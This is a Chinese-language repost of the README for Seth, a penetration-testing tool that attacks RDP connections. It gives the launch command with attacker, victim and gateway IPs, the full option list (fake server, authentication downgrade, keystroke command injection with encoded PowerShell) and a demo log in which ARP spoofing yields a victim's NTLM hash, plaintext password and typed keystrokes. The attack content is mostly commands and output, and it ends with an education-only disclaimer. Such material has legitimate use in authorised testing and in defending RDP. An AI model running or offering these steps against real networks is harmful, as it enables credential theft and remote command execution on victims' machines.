**Seth是一个用Python编写，试图降级RDP连接来提取明文凭据的工具。**

##  用法

像这样运行：

    
    
    $ ./seth.sh <INTERFACE> <ATTACKER IP> <VICTIM IP> <GATEWAY IP|HOST IP> [<COMMAND>]

除非RDP主机与受害计算机位于同一子网上，否则最后一个IP地址必须是网关的IP地址。

最后一个参数是可选的。它可以通过注入按键事件模拟WIN + R在RDP主机上执行的命令。注入按键取决于受害者使用的键盘布局 -目前它仅在英语美国版上可用。我建议避免使用特殊字符powershell -enc
<STRING>，其中STRING是您的UTF-16le和Base64编码命令。

shell脚本执行ARP欺骗以获得Man-in-the-Middle位置并重定向流量，使其通过RDP代理运行。代理可以单独调用。可将Seth与Responder结合使用。使用Responder获得Man-in-the-Middle位置并同时运行Seth。运行seth.py -h以获取更多信息：

    
    
    usage: seth.py [-h] [-d] [-f] [-p LISTEN_PORT] [-b BIND_IP] [-g {0,1,3,11}]
                   [-j INJECT] -c CERTFILE -k KEYFILE
                   target_host [target_port]
    RDP credential sniffer -- Adrian Vollmer, SySS GmbH 2017
    positional arguments:
      target_host           目标主机
      target_port           目标RDP服务的TCP端口（默认为3389）
    optional arguments:
      -h, --help            显示此帮助消息并退出
      -d, --debug           显示调试信息
      -f, --fake-server     执行'虚假的服务器'攻击
      -p LISTEN_PORT, --listen-port LISTEN_PORT
                            要侦听的TCP端口（默认为3389）
      -b BIND_IP, --bind-ip BIND_IP
                            绑定虚假服务的IP地址（默认全部）
      -g {0,1,3,11}, --downgrade {0,1,3,11}
                            将身份验证协议降级为此（默认值3）
      -j INJECT, --inject INJECT
                            命令通过按键事件注入执行
      -c CERTFILE, --certfile CERTFILE
                            证书文件的路径
      -k KEYFILE, --keyfile KEYFILE
                            密钥文件的路径

您还可以在Youtube上观看二十分钟的演示，包括演示（从14:00开始）：<https://www.youtube.com/watch?v=wdPkY7gykf4>

或者只在这里观看演示（带字幕）：<https://www.youtube.com/watch?v=JvvxTNrKV-s>

##  演示

以下输出显示了攻击者的视图。Seth嗅探了一个离线的可破解哈希以及明文密码。在这里，NLA没有强制执行，受害者忽略了证书警告。

    
    
    # ./seth.sh eth1 192.168.57.{103,2,102}
    ███████╗███████╗████████╗██╗  ██╗
    ██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer
    ███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de
    ╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017
    ███████║███████╗   ██║   ██║  ██║   https://www.syss.de
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
    [*] Spoofing arp replies...
    [*] Turning on IP forwarding...
    [*] Set iptables rules for SYN packets...
    [*] Waiting for a SYN packet to the original destination...
    [+] Got it! Original destination is 192.168.57.102
    [*] Clone the x509 certificate of the original destination...
    [*] Adjust the iptables rule for all packets...
    [*] Run RDP proxy...
    Listening for new connection
    Connection received from 192.168.57.103:50431
    Downgrading authentication options from 11 to 3
    Enable SSL
    alice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000
    Tamper with NTLM response
    TLS alert access denied, Downgrading CredSSP
    Connection lost
    Connection received from 192.168.57.103:50409
    Listening for new connection
    Enable SSL
    Connection lost
    Connection received from 192.168.57.103:50410
    Listening for new connection
    Enable SSL
    Hiding forged protocol request from client
    .\alice:ilovebob
    Keyboard Layout: 0x409 (English_United_States)
    Key press:   LShift
    Key press:   S
    Key release:                 S
    Key release:                 LShift
    Key press:   E
    Key release:                 E
    Key press:   C
    Key release:                 C
    Key press:   R
    Key release:                 R
    Key press:   E
    Key release:                 E
    Key press:   T
    Key release:                 T
    Connection lost
    [*] Cleaning up...
    [*] Done.

##  要求

> 1.python3
>
> 2.tcpdump
>
> 3.`arpspoof
>
> 4.arpspoof
>
> 5.`openssl

##  最后

使用风险由您自己承担。未经所有相关人员的完全同意，请勿使用。仅用于教育目的。

 ***参考来源：[GitHub](https://github.com/SySS-Research/Seth)，FB小编周大涛编译，转载请注明来自FreeBuf.COM**

  

